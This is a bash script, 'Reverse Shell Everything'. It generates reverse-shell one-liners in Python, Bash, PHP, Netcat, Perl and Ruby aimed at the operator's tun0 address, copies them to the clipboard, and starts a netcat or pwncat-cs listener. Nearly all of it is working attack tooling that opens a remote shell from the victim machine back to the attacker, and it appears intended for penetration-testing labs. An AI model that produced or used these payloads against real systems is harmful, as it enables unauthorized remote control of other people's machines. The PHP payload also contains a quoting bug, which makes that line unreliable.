#!/bin/bash

#Put into terminal using xautomation 
function call_cmd(){
	xte "str $1"
	sleep 0.5
	xte "key Return"
}

#Color Codes for Output
red='\033[0;31m'
green='\033[1;32m'
blue='\033[1;34m'
white='\033[1;37m'
yellow='\033[1;33m'

##Assuming pwncat is not on the system
pwncat=0

#Checking for pwncat-cs directory
DIR="/opt/pwncat"
if [ -d "$DIR" ]; then
  #Since Bash doesn't have boolean
  pwncat=1
fi

#IP Address finder
IP=$(ip -4 addr show tun0 | grep -oP '(?<=inet\s)\d+(\.\d+){3}' --color=none)

#Port Chooser
PORT=$(($RANDOM+3000))

#Payload Maker
function payloadmaker(){
	#Informing of Input Details
	echo -e "\n${white}Language Chosen: $1     IP Address: $IP       PORT: $PORT        LISTENER: $2"	
	echo -e "${green}Calling listener now......"
	sleep 2

	#Generating Payload
	if [ "$1" = "Python" ]; then
		echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$IP\",$PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" | xclip -selection clipboard
		listener "$2"

	elif [ "$1" = "Bash" ]; then
		echo "bash -i >& /dev/tcp/$IP/$PORT 0>&1" | xclip -selection clipboard
		listener "$2"
	
	elif [ "$1" = "PHP" ]; then
		echo "php -r '$sock=fsockopen(\"$IP\",$PORT);exec(\"/bin/sh -i <&3 >&3 2>&3\");'" | xclip -selection clipboard
		listener "$2"

	elif [ "$1" = "Netcat" ]; then
		echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $IP $PORT >/tmp/f" | xclip -selection clipboard
		listener "$2"

	elif [ "$1" = "Perl" ]; then
		echo "perl -e 'use Socket;\$i=$IP;\$p=$PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'" | xclip -selection clipboard
		listener "$2"
	
	elif [ "$1" = "Ruby" ]; then
		echo "ruby -rsocket -e'f=TCPSocket.open(\"$IP\",$PORT).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'" | xclip -selection clipboard
		listener "$2"

	else
		echo "Invalid payload.\nReport error to RST Error Forum on Github or write to us at rst@gmail.com"
		exit 1
	fi
}

function listener(){
	#Calling Listeners
	if [ $1 == "pwncat-cs" ]; then
		clear
		echo -e "${green}Pwncat Listener Started."
		echo -e "${white}pwncat-cs -lp $PORT"
		call_cmd "source /opt/pwncat/pwncat-env/bin/activate;pwncat-cs -lp $PORT"
	elif [ $1 == "Netcat" ]; then
		echo -e "${green}Netcat Listener Started."
		call_cmd "nc -lvnp $PORT" 
	fi
}

##Welcome Message
echo -e "${green}Reverse Shell Everything by Mustansir Godhrawala "

##Usage Error Message
if [ "$1" == "" ]; then
	echo -e "${red}Please enter parameters <Language> <Listener>\nUsage: rs help\nTo see the help menu"
	exit 1

##Help Menu 
elif [ "$1" = "help" ]; then 	
	echo -e "${white}Usage: rst <language> <listener>"
	echo -e "Language Options:\n1. Python\n2. Bash\n3. PHP\n4. Netcat\n5. Perl\n6. Ruby"
	echo -e "Listener Options:\n1. Netcat(Default)\n2. Pwncat-CS"
	echo -e "Usage Examples:\n1. rs rb netcat\n   For a ruby payload with a netcat listener."
	echo -e "\n2. rs python pwncat\n   For a python payload with a pwncat-cs listener."
	exit 1
fi

#Making sure pwncat-cs exists on system
if [ "$2" = 2 ] && [ $pwncat = 0 ]; then
	echo -e "${red}Pwncat-cs is not on the system and cannot be used as a listener, switching to default listener(netcat)."
	sleep 2
	set "$2" 1
fi

re='^[0-9]+$'
#Checking if there's a string in place of the language
if ! [[ $1 =~ $re ]] ; then
	langlower="$(echo $1 | tr '[:upper:]' '[:lower:]')"
fi
#Checking if there's a string in place of the listener
if ! [[ $2 =~ $re ]] ; then
	listenlower="$(echo $2 | tr '[:upper:]' '[:lower:]')"
fi

##Python Caller
if [ "$1" = 1 ] || [ "$langlower" = "python" ] ; then
	if [ "$2" = 1 ] || [ "$2" = "" ] || [ "$listenlower" = "nc" ] || [ "$listenlower" = "netcat" ]; then
		payloadmaker Python Netcat
	elif [ "$2" = 2 ]; then
		payloadmaker Python pwncat-cs
	fi

##Bash Caller
elif [ "$1" = 2 ] || [ "$langlower" = "bash" ]; then
	if [ "$2" = 1 ] || [ "$2" = "" ] || [ "$listenlower" = "nc" ] || [ "$listenlower" = "netcat" ]; then
		payloadmaker Bash Netcat
	elif [ "$2" = 2 ] || [ "$listenlower" = "pwncat" ] || [ "$listenlower" = "pwncat-cs" ] || [ "$listenlower" = "pwn" ]; then
		payloadmaker Bash pwncat-cs
	fi

##PHP Caller
elif [ "$1" = 3 ] || [ "$langlower" = "php" ] ; then
	if [ "$2" = 1 ] || [ "$2" = "" ] || [ "$listenlower" = "nc" ] || [ "$listenlower" = "netcat" ]; then
		payloadmaker PHP Netcat
	elif [ "$2" = 2 ] || [ "$listenlower" = "pwncat" ] || [ "$listenlower" = "pwncat-cs" ] || [ "$listenlower" = "pwn" ]; then
		payloadmaker PHP pwncat-cs
	fi

##Netcat Caller
elif [ "$1" = 4 ] || [ "$langlower" = "netcat" ] || [ "$langlower" = "nc" ]; then
	if [ "$2" = 1 ] || [ "$2" = "" ] || [ "$listenlower" = "nc" ] || [ "$listenlower" = "netcat" ]; then
		payloadmaker Netcat Netcat
	elif [ "$2" = 2 ] || [ "$listenlower" = "pwncat" ] || [ "$listenlower" = "pwncat-cs" ] || [ "$listenlower" = "pwn" ]; then
		payloadmaker Netcat pwncat-cs
	fi

##Perl Caller
elif [ "$1" = 5 ] || [ "$langlower" = "perl" ]; then
	if [ "$2" = 1 ] || [ "$2" = "" ] || [ "$listenlower" = "nc" ] || [ "$listenlower" = "netcat" ]; then
		payloadmaker Perl Netcat
	elif [ "$2" = 2 ] || [ "$listenlower" = "pwncat" ] || [ "$listenlower" = "pwncat-cs" ] || [ "$listenlower" = "pwn" ]; then
		payloadmaker Perl pwncat-cs
	fi

##Ruby Caller
elif [ "$1" = 6 ] || [ "$langlower" = "rb" ] || [ "$langlower" = "ruby" ]; then
	if [ "$2" = 1 ] || [ "$2" = "" ] || [ "$listenlower" = "nc" ] || [ "$listenlower" = "netcat" ]; then
		payloadmaker Ruby Netcat
	elif [ "$2" = 2 ] || [ "$listenlower" = "pwncat" ] || [ "$listenlower" = "pwncat-cs" ] || [ "$listenlower" = "pwn" ]; then
		payloadmaker Ruby pwncat-cs
	fi

else
	echo -e "${white}What is this garbled language thou must art speak. \"Help yourself\" my fellow breathren"
fi 